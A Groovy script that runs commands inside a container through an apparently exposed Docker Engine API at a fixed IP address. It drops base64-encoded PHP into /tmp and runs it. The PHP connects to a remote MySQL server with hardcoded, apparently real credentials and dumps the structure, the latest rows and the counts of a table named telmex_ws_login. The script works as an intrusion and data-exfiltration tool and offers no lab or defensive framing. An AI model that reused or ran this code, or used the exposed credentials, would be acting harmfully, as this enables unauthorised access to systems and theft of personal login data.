import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
$c=new mysqli("187.191.91.37","adaxxidb","JTQ6PrkecY3y1kVN","tienda",3306);
if($c->connect_error){die("FAIL:".$c->connect_error);}

echo "=== DESCRIBE telmex_ws_login ===\n";
$r=$c->query("DESCRIBE telmex_ws_login");
while($row=$r->fetch_row()){echo "$row[0]|$row[1]|$row[2]|$row[3]\n";}

echo "\n=== SAMPLE 10 (most recent) ===\n";
$r2=$c->query("SELECT * FROM telmex_ws_login ORDER BY 1 DESC LIMIT 10");
if($r2){
    $flds=$r2->fetch_fields();$h=[];foreach($flds as $f)$h[]=$f->name;
    echo implode("|",$h)."\n";
    while($row=$r2->fetch_row()){
        $clean=[];
        foreach($row as $v){
            $s=$v===null?"NULL":substr(preg_replace('/[\\r\\n\\t|]/',' ',(string)$v),0,80);
            $clean[]=$s;
        }
        echo implode("|",$clean)."\n";
    }
}

echo "\n=== DATE RANGE ===\n";
$r3=$c->query("SELECT MIN(id) as min_id, MAX(id) as max_id, COUNT(*) as total FROM telmex_ws_login");
while($row=$r3->fetch_row()){echo "min_id=$row[0] max_id=$row[1] total=$row[2]\n";}

// Check if there's a fecha column
$r4=$c->query("SHOW COLUMNS FROM telmex_ws_login LIKE '%fecha%' OR SHOW COLUMNS FROM telmex_ws_login LIKE '%time%'");
echo "\n=== DATE COLUMNS ===\n";
$r5=$c->query("SHOW COLUMNS FROM telmex_ws_login");
$hasDate=false;
while($col=$r5->fetch_row()){
    if(stripos($col[1],'date')!==false || stripos($col[1],'time')!==false || stripos($col[0],'fecha')!==false){
        echo "$col[0] ($col[1])\n";
        $hasDate=true;
    }
}
if(!$hasDate)echo "NO date columns\n";

$c->close();
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(20000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/tqwslogin.php && php /tmp/tqwslogin.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(30000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
